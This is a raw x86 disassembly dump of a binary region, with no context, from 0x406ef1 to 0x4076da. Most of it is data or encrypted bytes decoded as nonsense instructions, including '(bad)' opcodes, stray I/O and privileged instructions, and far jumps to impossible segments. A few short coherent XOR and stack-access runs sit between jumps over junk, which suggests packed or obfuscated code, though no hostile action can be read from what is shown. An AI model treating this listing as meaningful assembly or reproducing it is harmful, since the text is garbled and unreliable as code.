  406ef1:	shl    eax,0x2
  406ef4:	or     eax,DWORD PTR [ebp+0x10]
  406ef7:	jmp    0x407298
  406efc:	test   al,0xc
  406efe:	lea    ebp,[esi]
  406f00:	mov    cl,0xbc
  406f02:	test   al,0x9c
  406f04:	sahf   
  406f05:	cld    
  406f06:	lds    esp,FWORD PTR [ebx+edi*2-0x41304b61]
  406f0d:	dec    ecx
  406f0e:	mov    esi,0xbec4bdbe
  406f13:	mov    esi,0xc194715e
  406f18:	shl    DWORD PTR [edi+ebp*4+0x1],cl
  406f1c:	xchg   esi,eax
  406f1d:	jecxz  0x406f20
  406f1f:	test   al,0x83
  406f21:	xchg   esi,eax
  406f22:	mov    ecx,0x6dfbce3a
  406f27:	mov    bh,BYTE PTR [edx-0x569e1fee]
  406f2d:	adc    al,0x5a
  406f2f:	add    al,0xe1
  406f31:	inc    ebx
  406f33:	or     DWORD PTR [edx+0x73],esp
  406f36:	adc    al,0x73
  406f38:	mov    DWORD PTR [edx],ebp
  406f3a:	jmp    0x6a8a7cd
  406f3f:	pop    ds
  406f40:	sub    edi,DWORD PTR [ebx]
  406f42:	daa    
  406f43:	out    dx,eax
  406f44:	(bad)  
  406f45:	mov    ebx,0xdbc7d664
  406f4a:	inc    edi
  406f4b:	call   0xf32:0x6edc2e72
  406f52:	xchg   ecx,eax
  406f53:	test   BYTE PTR [ebx],ah
  406f55:	enter  0xd12a,0x12
  406f59:	cmp    ebp,DWORD PTR [ebp-0xd86847f]
  406f5f:	jp     0x406ef0
  406f61:	jle    0x406fb7
  406f63:	pop    esp
  406f64:	inc    eax
  406f65:	fdiv   DWORD PTR [edx-0x2b5c0c2]
  406f6b:	pop    esi
  406f6c:	stc    
  406f6d:	leave  
  406f6e:	inc    ecx
  406f6f:	clc    
  406f70:	and    eax,0x9dbd42fe
  406f75:	out    0x6d,eax
  406f77:	jno    0x406f1a
  406f79:	loopne 0x406fa0
  406f7b:	or     dh,BYTE PTR [edx]
  406f7d:	nop
  406f7e:	push   esi
  406f7f:	imul   eax,DWORD PTR [ecx+ebp*8],0xffffff96
  406f83:	inc    ecx
  406f84:	or     ecx,DWORD PTR [esi-0x6]
  406f87:	bound  ebp,QWORD PTR [ebx]
  406f89:	sub    eax,0x64d019ab
  406f8e:	cmp    al,0x6
  406f90:	shl    DWORD PTR [bx+si-0x54cc],cl
  406f95:	add    esi,DWORD PTR [ecx+esi*1]
  406f98:	ret    
  406f99:	popf   
  406f9a:	(bad)  [ebx]
  406f9c:	jns    0x406fe9
  406f9e:	inc    esp
  406f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa0:	leave  
  406fa1:	jb     0x406f65
  406fa3:	pop    ebp
  406fa4:	and    al,0xe3
  406fa7:	push   ss
  406fa8:	aad    0xf6
  406faa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fab:	rol    DWORD PTR [ebx+esi*8+0x5],0xf
  406fb0:	jns    0x406ffa
  406fb2:	sub    eax,0xae824720
  406fb7:	mov    BYTE PTR gs:[eax+0x28],al
  406fbb:	hlt    
  406fbc:	clc    
  406fbd:	inc    eax
  406fbe:	sub    BYTE PTR [ebx+0x2f],0x52
  406fc2:	call   0x9a45:0xb40a11cb
  406fc9:	ins    DWORD PTR es:[edi],dx
  406fca:	imul   eax,DWORD PTR [esi+eax*2+0x2ddba173],0x890ffeeb
  406fd5:	jnp    0x407031
  406fd7:	icebp  
  406fd8:	stc    
  406fd9:	jb     0x407001
  406fdb:	sbb    BYTE PTR [ebx+0x16],dh
  406fde:	stos   BYTE PTR es:[edi],al
  406fdf:	cmp    eax,0xb9b14bda
  406fe4:	js     0x406fa7
  406fe6:	and    edi,DWORD PTR [edi+0x52]
  406fe9:	pop    es
  406fea:	(bad)  
  406fec:	lea    esi,[esi]
  406fee:	add    bl,BYTE PTR [ecx]
  406ff0:	fadd   QWORD PTR [esi+edi*2+0x3084d117]
  406ff7:	fisttp QWORD PTR [eax-0x60f534cf]
  406ffd:	and    DWORD PTR [edi+0x7c],eax
  407000:	mov    edx,0xa84d8974
  407005:	adc    esp,DWORD PTR [edi]
  407007:	push   ecx
  407008:	push   0x37eb1c78
  40700d:	pop    esi
  40700e:	pop    ss
  40700f:	int3   
  407010:	sbb    al,0xb7
  407012:	xor    al,0x60
  407014:	mov    cs,WORD PTR [edi-0x64c4c1cd]
  40701a:	das    
  40701b:	pop    ebx
  40701c:	mov    WORD PTR [ecx],es
  40701e:	ret    0xe0cd
  407021:	icebp  
  407022:	inc    ebx
  407023:	adc    eax,0x53f2894b
  407028:	pop    ebp
  407029:	jbe    0x407086
  40702b:	xor    al,0xe9
  40702d:	mov    esi,0x175c8779
  407032:	sahf   
  407033:	in     eax,0xab
  407035:	hlt    
  407036:	cmp    BYTE PTR [ecx],al
  407038:	scas   eax,DWORD PTR es:[edi]
  407039:	mov    al,0x12
  40703b:	cmp    DWORD PTR [eax],ebx
  40703d:	test   DWORD PTR [ebx],ecx
  40703f:	adc    edx,esi
  407041:	out    0x39,al
  407043:	xor    al,0x50
  407045:	jp     0x40701b
  407047:	sbb    DWORD PTR [ebx+eiz*2+0x26],eax
  40704b:	fdiv   st,st(2)
  40704d:	outs   dx,DWORD PTR ds:[esi]
  40704e:	or     BYTE PTR [ebx+ebp*1],ch
  407051:	inc    edx
  407052:	xchg   ebp,eax
  407053:	ret    0x79a3
  407056:	icebp  
  407057:	push   0xd80baaf1
  40705c:	(bad)  
  40705d:	lock rol dh,cl
  407060:	jge    0x406ff3
  407062:	and    eax,DWORD PTR [ebx+ebx*8+0x5dd31ba7]
  407069:	add    edx,DWORD PTR [ecx+0x5376d887]
  40706f:	push   edi
  407070:	inc    edi
  407071:	pop    eax
  407072:	les    ecx,FWORD PTR [edx]
  407074:	retf   0x4320
  407077:	ja     0x4070e8
  407079:	daa    
  40707a:	mov    eax,0x47df0f89
  40707f:	iret   
  407080:	push   0xffffffc5
  407082:	out    0xce,eax
  407084:	popa   
  407085:	mov    esi,0xb7d9bda2
  40708a:	push   ebp
  40708b:	(bad)  
  40708d:	xchg   edi,eax
  40708e:	sub    cl,BYTE PTR [esi+0x12]
  407091:	xor    BYTE PTR [ebx],0x99
  407094:	(bad)  
  407095:	sub    eax,DWORD PTR [edx+0x5e]
  407098:	push   esp
  407099:	adc    bh,bl
  40709b:	icebp  
  40709c:	lods   eax,DWORD PTR ds:[esi]
  40709d:	sub    BYTE PTR [ebx-0x69],cl
  4070a0:	out    0x49,al
  4070a2:	mov    esp,0xa08882d3
  4070a7:	scas   al,BYTE PTR es:[edi]
  4070a8:	xor    esp,0xffffff9f
  4070ab:	cmp    BYTE PTR [esi],ah
  4070ad:	in     al,0x62
  4070af:	jns    0x4070ff
  4070b1:	mov    dl,0x6b
  4070b3:	ds sub eax,0x42552e68
  4070b9:	xor    al,0xe6
  4070bb:	xchg   esi,eax
  4070bc:	lahf   
  4070bd:	fidiv  WORD PTR [esi+0x70731cd0]
  4070c3:	jmp    0x4070de
  4070c5:	pop    ss
  4070c6:	iret   
  4070c7:	lock mov al,ds:0xdedf375c
  4070cd:	mov    esp,DWORD PTR [edx-0x7]
  4070d0:	push   es
  4070d1:	push   eax
  4070d2:	push   0x54
  4070d4:	int    0x47
  4070d6:	pop    ebx
  4070d7:	dec    esi
  4070d8:	ret    
  4070d9:	pusha  
  4070da:	std    
  4070db:	jbe    0x407143
  4070dd:	xor    al,0x34
  4070df:	push   esp
  4070e0:	mov    DWORD PTR [edi-0x53],ecx
  4070e3:	fdiv   QWORD PTR [edx-0x211b1eb6]
  4070e9:	mov    ah,0xdc
  4070eb:	fbstp  TBYTE PTR [esi-0x63]
  4070ee:	push   ecx
  4070ef:	cmp    BYTE PTR [edx],al
  4070f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070f2:	retf   0x9a74
  4070f5:	pop    esp
  4070f6:	popf   
  4070f7:	stc    
  4070f8:	repz jmp 0x19659557
  4070fe:	jmp    0x4070af
  407100:	sbb    eax,DWORD PTR [ebp-0x19]
  407103:	cmc    
  407104:	outs   dx,DWORD PTR ds:[esi]
  407105:	(bad)  
  407107:	cmp    esp,ecx
  407109:	daa    
  40710a:	push   ecx
  40710b:	(bad)  
  40710c:	sti    
  40710d:	mov    ds:0x30403e1,al
  407112:	push   eax
  407113:	inc    edx
  407114:	xlat   BYTE PTR ds:[ebx]
  407115:	dec    ebx
  407116:	outs   dx,BYTE PTR ds:[esi]
  407117:	es test ax,0x9111
  40711c:	jge    0x4070ae
  40711e:	or     BYTE PTR [edx-0x6bb2a701],0xe2
  407125:	sbb    eax,ebx
  407127:	mov    esi,ebp
  407129:	into   
  40712a:	xchg   ebx,eax
  40712b:	adc    DWORD PTR [esp+eiz*4+0x33],0xffffffdd
  407130:	es dec eax
  407132:	mov    ebp,0xdd6a1ea9
  407137:	push   cs
  407138:	or     al,0x68
  40713a:	loopne 0x4070fc
  40713c:	and    esi,DWORD PTR [ecx+0x59aa33]
  407142:	sbb    bl,ch
  407144:	stos   DWORD PTR es:[edi],eax
  407145:	sbb    eax,0x947ada98
  40714a:	es pop eax
  40714c:	mov    edi,0xaebddc8c
  407151:	js     0x407153
  407153:	mov    eax,ds:0x9cf0f579
  407158:	adc    eax,ebx
  40715a:	adc    BYTE PTR [eax],dl
  40715c:	pop    ds
  40715d:	aam    0xbc
  40715f:	push   eax
  407160:	jle    0x4071bb
  407162:	sbb    eax,0x6a398b9f
  407167:	cmp    edx,esi
  407169:	sti    
  40716a:	test   al,0x7f
  40716c:	ds dec esp
  40716e:	(bad)  
  40716f:	jmp    0x4831da1b
  407174:	add    BYTE PTR [ebp-0x36173f49],dl
  40717a:	iret   
  40717b:	cs aaa 
  40717d:	gs jp  0x407186
  407180:	icebp  
  407181:	leave  
  407182:	mov    bh,0xb4
  407184:	xor    ebp,0x3b
  407187:	ja     0x407163
  407189:	adc    eax,0xe5b8ff51
  40718e:	daa    
  40718f:	and    eax,0x47bc61ad
  407194:	xor    dl,BYTE PTR [ebx-0x11]
  407197:	add    esi,esi
  407199:	xor    eax,0x9e5974f0
  40719e:	cmp    cl,BYTE PTR [eax]
  4071a0:	add    DWORD PTR ds:0x36d02b94,ebp
  4071a6:	xor    eax,0x5606eb83
  4071ab:	cmp    eax,0xd36e9aac
  4071b0:	fwait
  4071b1:	mov    dl,BYTE PTR [ebp+0x24bdab97]
  4071b7:	jle    0x40716f
  4071b9:	adc    dh,BYTE PTR [edx+0x5ac356ce]
  4071bf:	mov    ds:0xbe41a2f8,eax
  4071c4:	mov    ch,0xa
  4071c6:	xor    al,0xb4
  4071c8:	test   al,bl
  4071ca:	xor    edi,edx
  4071cc:	push   esp
  4071cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ce:	in     eax,dx
  4071cf:	cmc    
  4071d0:	std    
  4071d1:	mov    eax,esi
  4071d3:	mov    ch,0x87
  4071d5:	and    al,0x6
  4071d7:	sbb    DWORD PTR [ebx+0x30],0xffffffbb
  4071db:	fstp   QWORD PTR [esi]
  4071dd:	enter  0xc2d5,0x4
  4071e1:	popf   
  4071e2:	cmp    eax,0x4d6e4d5b
  4071e7:	and    eax,0x18147e6a
  4071ec:	shl    BYTE PTR [esi],0xf0
  4071ef:	lahf   
  4071f0:	into   
  4071f1:	fwait
  4071f2:	pop    ecx
  4071f3:	jno    0x407245
  4071f5:	pop    ds
  4071f6:	cmc    
  4071f7:	fdiv   QWORD PTR [ecx+ebp*1+0x6b]
  4071fb:	jo     0x4071fc
  4071fd:	push   0x947667b5
  407202:	into   
  407203:	cwde   
  407204:	pop    ebp
  407205:	push   edx
  407206:	loope  0x407246
  407208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407209:	dec    eax
  40720a:	sub    al,0xd7
  40720c:	shr    DWORD PTR [eax+0x7647db9d],1
  407212:	sar    BYTE PTR [ebp-0x60fe2e4b],cl
  407218:	sbb    al,0xe4
  40721a:	rol    ebp,1
  40721c:	jge    0x4071e8
  40721e:	test   esi,edi
  407220:	ds sbb bl,ah
  407223:	mov    al,0x5f
  407225:	(bad)
  407228:	test   DWORD PTR [edi-0x1d],ebp
  40722b:	js     0x407216
  40722d:	sub    al,0xa0
  40722f:	fidivr WORD PTR [ecx+0x889e6b3]
  407235:	loopne 0x407236
  407237:	cli    
  407238:	enter  0x9953,0xfc
  40723c:	repnz scas eax,DWORD PTR es:[edi]
  40723e:	or     al,0xae
  407240:	retf   
  407241:	(bad)  
  407243:	dec    esp
  407244:	push   DWORD PTR [edi-0x29]
  407247:	ret    
  407248:	scas   al,BYTE PTR es:[edi]
  407249:	mov    eax,ds:0xae4e6338
  40724e:	fnstcw WORD PTR [ebx]
  407250:	dec    esp
  407251:	push   edi
  407252:	cmp    BYTE PTR [edi+ecx*4-0x5a],dh
  407256:	outs   dx,BYTE PTR ds:[esi]
  407257:	fsubr  DWORD PTR ds:0x49b4d8eb
  40725d:	aam    0x3e
  40725f:	fwait
  407260:	push   0x1b721f34
  407265:	mov    ds:0x98ca3428,eax
  40726a:	popf   
  40726b:	inc    edx
  40726c:	pop    es
  40726d:	cdq    
  40726e:	pop    ds
  40726f:	mov    BYTE PTR [ebx],dh
  407271:	(bad)  
  407272:	fild   DWORD PTR [ebp+0x1a8c851f]
  407278:	out    dx,eax
  407279:	or     cl,BYTE PTR [edx-0x13]
  40727c:	(bad)  
  40727d:	lahf   
  40727e:	aad    0xa6
  407280:	jmp    0x2792d1df
  407285:	ss pushf 
  407287:	(bad)  
  407288:	fisttp WORD PTR [edi+0x23dd807d]
  40728e:	cmp    bl,bh
  407290:	lods   eax,DWORD PTR ds:[esi]
  407291:	int    0xb9
  407293:	inc    ebx
  407294:	jae    0x40728e
  407296:	mov    bh,0x23
  407298:	xor    edi,ecx
  40729a:	xor    edx,eax
  40729c:	xor    edx,0xcb79b576
  4072a2:	xor    edi,0x9c2b8ae8
  4072a8:	mov    DWORD PTR [esi],edx
  4072aa:	jmp    0x40764b
  4072af:	mov    bl,0xe6
  4072b1:	ds lahf 
  4072b3:	pushf  
  4072b4:	test   al,0xb4
  4072b6:	stc    
  4072b7:	jo     0x4072e0
  4072b9:	inc    edx
  4072ba:	fst    QWORD PTR [ebp-0x422ed5de]
  4072c0:	dec    edi
  4072c1:	mov    esi,0xbec4bdbe
  4072c6:	mov    esi,0xdb7669f5
  4072cb:	sub    ebx,0xffffffb8
  4072ce:	pop    eax
  4072cf:	pop    esp
  4072d0:	pop    ebx
  4072d1:	or     DWORD PTR ds:0x6aaffcd6,esp
  4072d7:	sub    DWORD PTR [edx+0x7d11db4b],0x27
  4072de:	add    al,0xe5
  4072e0:	pop    ss
  4072e1:	imul   eax,DWORD PTR [ecx],0xfffffff8
  4072e4:	sbb    DWORD PTR [edx-0x2f],ebp
  4072e7:	loope  0x407361
  4072e9:	fld    QWORD PTR [ecx+0x34f8debf]
  4072ef:	add    eax,edi
  4072f1:	and    BYTE PTR [eax+0x20ac71d8],al
  4072f7:	mov    BYTE PTR [ebp+0x695bc116],dl
  4072fd:	pop    esp
  4072fe:	mov    eax,ds:0x200a9def
  407303:	dec    eax
  407305:	mov    bh,0xd5
  407307:	mov    BYTE PTR [eax],0x17
  40730a:	fdiv   DWORD PTR [ebx-0x49a5b2e3]
  407310:	test   BYTE PTR [esi-0x59],bh
  407313:	das    
  407314:	adc    BYTE PTR [ebx-0x44def84f],bl
  40731a:	jo     0x407397
  40731c:	cmp    eax,0x6fd117a1
  407321:	rol    DWORD PTR [ecx],0x6
  407324:	cmp    al,0xe0
  407326:	ds mov ecx,0x4347bf65
  40732c:	cdq    
  40732d:	xchg   DWORD PTR [ecx],edx
  40732f:	mov    BYTE PTR [eax+0x2],al
  407332:	push   0x534f1833
  407337:	fdiv   QWORD PTR [edi+ebp*1]
  40733a:	add    al,dh
  40733c:	in     al,dx
  40733d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40733e:	test   DWORD PTR [eax-0x5c137ce2],0xa178ae5e
  407348:	std    
  407349:	mov    ch,0x18
  40734b:	pop    edx
  40734c:	mov    edi,0xfadfa98d
  407351:	mov    WORD PTR [ebp-0x2ea7c4b1],?
  407357:	std    
  407358:	jmp    0x9dacea84
  40735d:	xor    ah,BYTE PTR [eax-0x7742bb45]
  407363:	int3   
  407364:	cmp    ebp,DWORD PTR [ecx-0x7ab0f42f]
  40736a:	and    eax,0x4f7af942
  40736f:	clc    
  407370:	mov    ebx,0x9a7d8ecd
  407375:	jmp    0xfb19:0xdd64448
  40737c:	push   es
  40737d:	ret    0x9087
  407380:	add    BYTE PTR [edi-0x53],al
  407383:	fwait
  407384:	pop    eax
  407385:	add    al,0x7
  407387:	ja     0x407339
  407389:	xchg   DWORD PTR [eax+0x5e],eax
  40738c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40738d:	and    esi,DWORD PTR es:[ebp+0xe]
  407391:	out    0x89,eax
  407393:	sub    eax,0x6ec079b1
  407398:	xchg   edx,eax
  407399:	push   es
  40739a:	add    dl,BYTE PTR [ecx]
  40739c:	dec    edx
  40739d:	lahf   
  40739e:	mov    edi,0x58e61f89
  4073a3:	inc    edx
  4073a4:	xchg   esp,eax
  4073a5:	pushf  
  4073a6:	push   cs
  4073a7:	mov    ebp,DWORD PTR gs:[eax+0x4bf663f4]
  4073ae:	cmp    al,0xe0
  4073b0:	jne    0x4073c6
  4073b2:	and    edx,esi
  4073b4:	nop
  4073b5:	dec    ecx
  4073b6:	(bad)  
  4073b7:	mov    al,ds:0x3580de6e
  4073bc:	and    BYTE PTR [ebx],dh
  4073be:	dec    esp
  4073bf:	cmp    esp,DWORD PTR [edx-0x4f]
  4073c2:	hlt    
  4073c3:	pop    ds
  4073c4:	imul   dl
  4073c6:	test   al,0x9c
  4073c8:	stos   DWORD PTR es:[edi],eax
  4073c9:	pop    es
  4073ca:	add    eax,0xe3933cbf
  4073cf:	and    al,0x8
  4073d1:	icebp  
  4073d2:	mov    bh,0x9c
  4073d4:	sub    al,0xc7
  4073d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073d7:	cmp    DWORD PTR ds:0xeb0cfeef,ebp
  4073dd:	fmul   QWORD PTR [edx]
  4073df:	scas   eax,DWORD PTR es:[edi]
  4073e0:	mov    BYTE PTR [ecx+0x54c21456],dl
  4073e6:	add    ah,ah
  4073e8:	jmp    0xc7a0:0xe44085bc
  4073ef:	gs in  eax,0xb4
  4073f2:	pop    eax
  4073f3:	push   esi
  4073f4:	(bad)  
  4073f5:	aas    
  4073f6:	push   ecx
  4073f7:	sub    esp,0xfffffff1
  4073fa:	out    0xc6,eax
  4073fc:	out    0x90,eax
  4073fe:	enter  0xa199,0x44
  407402:	add    eax,0xa256f3ac
  407407:	js     0x4073da
  407409:	fcmove st,st(4)
  40740b:	clc    
  40740c:	push   ebx
  40740d:	xor    dh,BYTE PTR [edi+0x174c98d4]
  407413:	jbe    0x407463
  407415:	xor    BYTE PTR [ebp-0x49],al
  407418:	xchg   ebp,eax
  407419:	mov    ds:0x84a5ea01,al
  40741e:	xor    BYTE PTR [ebx-0x330aed7a],0xc5
  407425:	push   ebx
  407426:	inc    ebp
  407427:	pop    eax
  407428:	push   ds
  407429:	jg     0x4073ee
  40742b:	xchg   BYTE PTR [esi+ecx*1+0x11b19952],bh
  407432:	and    BYTE PTR [edi-0x48],dl
  407435:	sbb    eax,0xd9ee31e8
  40743a:	loopne 0x4073e8
  40743c:	shl    DWORD PTR [edx],1
  40743e:	loop   0x4074bc
  407440:	jmp    0xce48:0xcc9f530c
  407447:	xchg   ebp,eax
  407448:	jbe    0x407418
  40744a:	fwait
  40744b:	sbb    BYTE PTR [eax+0x1008277d],bh
  407451:	cmp    edx,DWORD PTR ds:0x7efc5528
  407457:	es xor esi,ebp
  40745a:	mov    BYTE PTR [eax-0x40],bl
  40745d:	pushf  
  40745e:	sub    eax,0x7d79836b
  407463:	xor    bh,BYTE PTR [ebx-0x40]
  407466:	xor    al,0x36
  407468:	and    eax,0xbacfd7c7
  40746d:	push   cs
  40746e:	pop    ds
  40746f:	cmp    DWORD PTR [ecx],edi
  407471:	sbb    esp,DWORD PTR [edx-0x3c8c619f]
  407477:	xor    ebx,eax
  407479:	push   edi
  40747a:	cwde   
  40747b:	mov    cl,0x93
  40747d:	fwait
  40747e:	lock das 
  407480:	js     0x407487
  407482:	aaa    
  407483:	fmul   DWORD PTR [eax]
  407485:	mov    bl,0x5e
  407487:	mov    bl,0xcf
  407489:	sub    eax,0xb202a9d6
  40748e:	les    edi,FWORD PTR [edx+0x4af839d8]
  407494:	adc    cl,ch
  407496:	sbb    dl,BYTE PTR [edi-0x3b04bc30]
  40749c:	sbb    eax,0x9dc24b8d
  4074a1:	fwait
  4074a2:	xor    eax,0xfbe0fbf3
  4074a7:	inc    ecx
  4074a8:	mov    DWORD PTR [edi-0x40ce374e],ebp
  4074ae:	jo     0x407496
  4074b0:	retf   0x2f17
  4074b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074b4:	mov    BYTE PTR [esi+eax*1+0x4a6b7ce9],ah
  4074bb:	mov    ebp,0x82a0b635
  4074c0:	gs inc ebp
  4074c2:	pop    ecx
  4074c3:	jp     0x407499
  4074c5:	sbb    al,0x86
  4074c7:	sub    DWORD PTR [edi-0x20],ebx
  4074ca:	sti    
  4074cb:	jp     0x40746a
  4074cd:	cwde   
  4074ce:	dec    ecx
  4074cf:	fcmovu st,st(6)
  4074d1:	push   ecx
  4074d2:	repz cmp esi,eax
  4074d5:	lods   eax,DWORD PTR ds:[esi]
  4074d6:	cdq    
  4074d7:	iret   
  4074d8:	adc    ch,bh
  4074da:	bound  esp,QWORD PTR [eax-0x2ec95eab]
  4074e0:	and    DWORD PTR [ebp-0x63],esp
  4074e3:	push   ds
  4074e4:	lods   al,BYTE PTR ds:[esi]
  4074e5:	cmp    eax,0xaa4576d0
  4074ea:	pusha  
  4074eb:	jb     0x407562
  4074ed:	popf   
  4074ee:	inc    esi
  4074ef:	enter  0x8866,0x30
  4074f3:	retf   0x8543
  4074f6:	sbb    ch,ch
  4074f8:	dec    esp
  4074f9:	out    dx,eax
  4074fa:	jno    0x407493
  4074fc:	repz sub edx,esp
  4074ff:	sub    ebx,eax
  407501:	xchg   esp,eax
  407502:	pop    ss
  407503:	into   
  407504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407505:	pop    eax
  407506:	pop    es
  407507:	push   es
  407508:	fldl2t 
  40750a:	stc    
  40750b:	fidivr WORD PTR [edx+0x6f]
  40750e:	lahf   
  40750f:	xchg   ebp,eax
  407510:	sub    eax,0x60b66d36
  407515:	xchg   esp,eax
  407516:	repnz icebp 
  407518:	pop    esi
  407519:	adc    DWORD PTR [ecx+0x658872bc],esi
  40751f:	in     al,dx
  407520:	push   ebx
  407521:	stos   BYTE PTR es:[edi],al
  407522:	mov    bl,0x68
  407524:	cmc    
  407525:	out    dx,eax
  407526:	aaa    
  407527:	jle    0x407532
  407529:	and    eax,0x817c9e8d
  40752e:	data16 fadd QWORD PTR [edi-0x5c8d8a8e]
  407535:	sub    edx,DWORD PTR cs:[ecx+0x502cb6f0]
  40753c:	stc    
  40753d:	or     cl,BYTE PTR [edx-0x73d771ee]
  407543:	add    al,0x74
  407545:	cmp    ebp,edx
  407547:	dec    ebx
  407548:	ins    BYTE PTR es:[edi],dx
  407549:	repz mov bl,0xb7
  40754c:	(bad)  
  40754d:	adc    DWORD PTR [edx-0x15],edi
  407550:	xor    eax,0xea7a2b92
  407555:	out    dx,eax
  407556:	jecxz  0x4075aa
  407558:	dec    ecx
  407559:	add    eax,0xbee4a7b6
  40755e:	jl     0x407515
  407560:	scas   al,BYTE PTR es:[edi]
  407561:	jae    0x407576
  407563:	std    
  407564:	sub    bl,BYTE PTR [ebp-0x4f]
  407567:	mov    ch,0x4b
  407569:	mov    al,ds:0x6cdf37c0
  40756e:	jge    0x407544
  407570:	fistp  QWORD PTR [eax+0x2d]
  407573:	test   ebp,esp
  407575:	add    eax,DWORD PTR ds:[ebx-0x357b64ab]
  40757c:	aas    
  40757d:	adc    al,0xce
  40757f:	pop    edi
  407580:	dec    edx
  407581:	xor    BYTE PTR [ebx],al
  407583:	xor    ebx,DWORD PTR [esi]
  407585:	lahf   
  407586:	pop    esi
  407587:	ins    DWORD PTR es:[edi],dx
  407588:	push   es
  407589:	ins    DWORD PTR es:[edi],dx
  40758a:	inc    ebx
  40758b:	jmp    0xab5d2d5a
  407590:	imul   eax,DWORD PTR [edx+0x26],0x7bfc0032
  407597:	inc    edx
  407598:	push   esp
  407599:	mov    edx,DWORD PTR [edi]
  40759b:	gs inc ecx
  40759d:	cmp    BYTE PTR [eax+0x5e18ff35],al
  4075a3:	push   ds
  4075a4:	out    dx,al
  4075a5:	mov    bh,0xdf
  4075a7:	lods   eax,DWORD PTR ds:[esi]
  4075a8:	inc    ebp
  4075a9:	jmp    0x4075e9
  4075ab:	xor    ecx,DWORD PTR [edi-0x3a1f4f41]
  4075b1:	push   0xffffffdd
  4075b3:	jo     0x4075d6
  4075b5:	mov    BYTE PTR [edi-0x57f19845],ah
  4075bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075bc:	mov    ah,0x9
  4075be:	mov    ebp,0x7afeff33
  4075c3:	lods   eax,DWORD PTR ds:[esi]
  4075c4:	adc    eax,0x3e3becec
  4075c9:	std    
  4075ca:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075cd:	xchg   ebp,eax
  4075ce:	std    
  4075cf:	mov    bh,0x4a
  4075d1:	sbb    DWORD PTR [ebx+0x1e0383dc],0xd8c30dbe
  4075db:	stos   DWORD PTR es:[edi],eax
  4075dc:	cmp    ch,BYTE PTR [eax-0x246221f4]
  4075e2:	ss js  0x4075f8
  4075e5:	scas   eax,DWORD PTR es:[edi]
  4075e6:	xor    esi,esp
  4075e8:	ins    BYTE PTR es:[edi],dx
  4075e9:	clc    
  4075ea:	mov    eax,ds:0x91eeef7
  4075ef:	jmp    0xac55:0x720d1223
  4075f6:	sub    bl,BYTE PTR [edx+0x30]
  4075f9:	push   ebp
  4075fa:	xlat   BYTE PTR ds:[ebx]
  4075fb:	stos   BYTE PTR es:[edi],al
  4075fc:	pushf  
  4075fd:	loopne 0x4075fd
  4075ff:	retf   0x6ccb
  407602:	mov    edx,0xa08aeb5b
  407607:	stos   BYTE PTR es:[edi],al
  407608:	and    DWORD PTR [ebx+0x599bf7c0],ebp
  40760e:	dec    edi
  40760f:	fcos   
  407611:	inc    ecx
  407612:	sub    eax,DWORD PTR [esi]
  407614:	dec    esi
  407615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407616:	or     BYTE PTR [ebx+0x772bdad4],ah
  40761c:	add    DWORD PTR [edi-0x6b08571d],ebp
  407622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407624:	daa    
  407625:	dec    ecx
  407626:	ret    0x203a
  407629:	ds inc ebx
  40762b:	push   esi
  40762c:	leave  
  40762d:	or     bh,BYTE PTR [edi+0x5a]
  407630:	xor    ah,bl
  407632:	test   al,0x9
  407634:	sbb    DWORD PTR [edx+0x68],eax
  407637:	dec    esi
  407638:	dec    ecx
  407639:	mov    ch,0x7f
  40763b:	outs   dx,BYTE PTR ds:[esi]
  40763c:	out    dx,al
  40763d:	sub    BYTE PTR [eax+eax*2],dh
  407640:	test   ah,dl
  407642:	or     esi,DWORD PTR [edi-0x37]
  407645:	mov    WORD PTR [ebx-0x2fc573e7],fs
  40764b:	mov    DWORD PTR [esi+0x4],edi
  40764e:	jmp    0x4083e6
  407653:	mov    eax,DWORD PTR [ebp-0x24]
  407656:	add    eax,DWORD PTR [ebp-0x4]
  407659:	mov    DWORD PTR [ebp-0x28],eax
  40765c:	mov    eax,DWORD PTR [ebp-0x28]
  40765f:	mov    eax,DWORD PTR [ebp-0x4]
  407662:	mov    eax,DWORD PTR [ebp-0x28]
  407665:	mov    eax,DWORD PTR [eax+0xc]
  407668:	mov    edx,DWORD PTR [ebp-0x4]
  40766b:	movzx  eax,WORD PTR [edx+eax*1]
  40766f:	cdq    
  407670:	shld   edx,eax,0x2
  407674:	xor    edx,ecx
  407676:	mov    DWORD PTR [ebp+0xc],edx
  407679:	jmp    0x407a1a
  40767e:	sbb    BYTE PTR [edi-0x2f],cl
  407681:	pop    esi
  407682:	call   0x3e77:0x3eb7bc64
  407689:	fucomp st(1)
  40768b:	mov    esi,0x57be90d3
  407690:	mov    esi,0xbec4bdbe
  407695:	mov    esi,0xc411f8a8
  40769a:	sbb    esi,DWORD PTR [ebx]
  40769c:	dec    ebp
  40769d:	sub    al,0xe6
  40769f:	push   eax
  4076a0:	mov    cl,0x2e
  4076a2:	ficom  WORD PTR [edx+esi*4]
  4076a5:	dec    ecx
  4076a6:	daa    
  4076a7:	dec    esp
  4076a9:	sub    DWORD PTR [ebp-0x44],0xffffffd2
  4076ad:	mov    esi,0x6e445c4d
  4076b2:	or     eax,0xd4d60cad
  4076b7:	cld    
  4076b8:	and    eax,DWORD PTR [esi+0x297a6311]
  4076be:	push   ss
  4076bf:	(bad)  
  4076c0:	popa   
  4076c1:	mov    esp,0x172165ef
  4076c6:	push   ss
  4076c7:	ds daa 
  4076c9:	push   0xb
  4076cb:	push   esi
  4076cc:	push   eax
  4076cd:	mov    WORD PTR [edi+0x53f65edd],?
  4076d3:	test   DWORD PTR [esi-0x8],ebp
  4076d6:	cld    
  4076d7:	shl    BYTE PTR [edx-0x26],cl
  4076da:	inc    esp
